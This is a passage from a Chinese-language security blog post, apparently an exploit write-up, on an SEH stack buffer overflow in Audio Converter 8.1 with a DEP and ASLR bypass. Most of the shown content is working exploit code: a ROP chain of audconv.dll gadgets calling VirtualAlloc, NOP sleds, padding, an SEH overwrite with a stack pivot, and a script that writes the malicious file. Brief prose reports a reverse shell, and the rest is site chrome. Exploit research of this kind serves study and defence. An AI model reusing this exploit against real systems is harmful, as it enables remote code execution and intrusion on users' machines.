[audconv.dll]</span></span><br><span class="line">	  <span class="number">0x1008264a</span>,  <span class="comment"># POP EAX # RETN [audconv.dll] </span></span><br><span class="line">	  <span class="number">0x100952c4</span>,  <span class="comment"># ptr to &amp;VirtualAlloc() [IAT audconv.dll]</span></span><br><span class="line">	  <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">	  <span class="number">0x1002ef14</span>,  <span class="comment"># PUSHAD # RETN [audconv.dll] </span></span><br><span class="line">	  <span class="comment">#[---INFO:extras:---]</span></span><br><span class="line">	  <span class="number">0x1002debd</span>,  <span class="comment"># ptr to 'push esp # ret ' [audconv.dll]</span></span><br><span class="line">	]</span><br><span class="line">	<span class="keyword">return</span> <span class="string">b''</span>.join(struct.pack(<span class="string">'&lt;I'</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets)</span><br><span class="line"></span><br><span class="line">rop_chain = create_rop_chain()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nops1 = <span class="string">b"\x90"</span>*<span class="number">32</span></span><br><span class="line">junk1 = <span class="string">b"A"</span>*<span class="number">32</span></span><br><span class="line">nops2 = <span class="string">b"\x90"</span>*(<span class="number">1240</span>+<span class="number">108</span>)  <span class="comment">#</span></span><br><span class="line">payload = nops2+rop_chain+nops1+shellcode</span><br><span class="line">junk2 = <span class="string">b"A"</span>*(<span class="number">4436</span>-len(payload)<span class="number">-32</span>)</span><br><span class="line"><span class="comment"># seh = b"\xcc\xcc\xcc\xcc"</span></span><br><span class="line">seh = struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x100646bb</span>) <span class="comment"># ADD ESP,0E44 # RETN</span></span><br><span class="line">junk3 = <span class="string">b"C"</span>*(<span class="number">45544</span><span class="number">-4432</span><span class="number">-4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">"wb"</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(junk1+payload+junk2+seh+junk3)</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹<code>shell</code>：</p>
+<p><img src="/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/03.png" alt="BOF"></p>
+<p>来看一下<code>win10</code>，不开启<code>DEP</code>。溢出时，可以看到<code>SEH</code>链的第二条被我们覆盖了：</p>
+<p><img src="/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/09.png" alt="BOF"></p>
+<p>在异常处理的时候，出现如下问题：（会一直停留在第一个异常处理函数里面，无法跳出）</p>
+<p><img src="/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/10.png" alt="BOF"></p>
+<p>谷歌了一下，说是异常没有捕获到。这里就不进一步讨论了。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>n0maj1o24
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/" title="Audio Converter 8.1 - SEH Stack Buffer Overflow:DEP and ASLR bypass">https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Windows/" rel="tag"># Windows</a>
+              <a href="/tags/Stack-Based-Overflows/" rel="tag"># Stack Based Overflows</a>
+              <a href="/tags/DEP/" rel="tag"># DEP</a>
+              <a href="/tags/ROP/" rel="tag"># ROP</a>
+              <a href="/tags/ASLR/" rel="tag"># ASLR</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/10/CoolPlayer-Portable-2-19-6-m3u-File-Stack-Overflow-Egghunter-ASLR-Bypass/" rel="prev" title="CoolPlayer+ Portable 2.19.6 - '.m3u' File Stack Overflow:Egghunter+ASLR Bypass">
+      <i class="fa fa-chevron-left"></i> CoolPlayer+ Portable 2.19.6 - '.m3u' File Stack Overflow:Egghunter+ASLR Bypass
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="n0maj1o24"
+      src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">n0maj1o24</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/n0maj1o24" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;n0maj1o24" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-nd.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">n0maj1o24</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'YxcX5Cznyp28BYsOhkgW4VH2-gzGzoHsz',
+      appKey     : 'DNYhYDu0OfL5c9gaMjQ1vbNC',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
